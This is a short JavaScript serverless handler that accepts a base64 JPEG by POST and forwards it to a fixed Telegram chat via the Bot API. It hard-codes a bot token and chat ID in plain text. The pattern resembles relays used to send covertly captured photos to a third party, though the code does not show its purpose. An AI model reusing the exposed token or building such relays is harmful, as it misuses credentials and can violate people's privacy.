const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '7391339726:AAGvGFhkxLmdLS1irRMTMnzUnNHBHskXZMY';
const CHAT_ID = '1174153911';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send({ message: 'Only POST requests are allowed' });
    }

    const { image } = req.body;

    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = '/tmp/image.jpg'; 
    fs.writeFileSync(filePath, base64Data, 'base64');

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(filePath));

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders()
            }
        });
        console.log('Image sent successfully:', response.data);
        res.json({ status: 'success' });
    } catch (error) {
        console.error('Error sending image:', error);
        res.status(500).json({ status: 'error' });
    }
}
